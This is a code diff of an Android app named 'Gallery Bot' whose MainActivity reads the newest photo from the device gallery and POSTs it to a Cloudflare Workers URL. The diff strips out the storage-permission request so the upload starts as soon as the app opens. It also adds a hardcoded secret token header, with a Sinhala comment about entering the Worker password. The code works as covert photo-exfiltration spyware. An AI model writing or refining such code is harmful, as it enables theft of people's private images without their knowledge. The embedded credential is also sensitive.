@@ -1,15 +1,11 @@
 package com.example.botapp;
 
-import android.Manifest;
 import android.app.Activity;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.MediaStore;
 import android.widget.TextView;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -18,33 +14,16 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class MainActivity extends Activity {
-    private static final int PERMISSION_REQUEST_CODE = 100;
     private static final String CF_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         TextView tv = new TextView(this);
-        tv.setText("Gallery Bot Active");
+        tv.setText("Gallery Bot Running...");
         setContentView(tv);
 
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, new String[]{
-                Manifest.permission.READ_EXTERNAL_STORAGE,
-                Manifest.permission.READ_MEDIA_IMAGES
-            }, PERMISSION_REQUEST_CODE);
-        } else {
-            sendLatestPhoto(CF_URL);
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                sendLatestPhoto(CF_URL);
-            }
-        }
+        sendLatestPhoto(CF_URL);
     }
 
     private void sendLatestPhoto(String targetUrl) {
@@ -78,6 +57,10 @@ public class MainActivity extends Activity {
             HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
+            
+            // මෙන්න මෙතැනට ඔයාගේ පාස්වර්ඩ් එක දෙන්න (Cloudflare Worker එකට දුන් එකම විය යුතුය)
+            conn.setRequestProperty("X-Secret-Token", "sabeer@1163");
+            
             conn.setRequestProperty("Content-Type", "application/octet-stream");
 
             OutputStream out = conn.getOutputStream();
@@ -96,3 +79,4 @@ public class MainActivity extends Activity {
         }
     }
 }
+
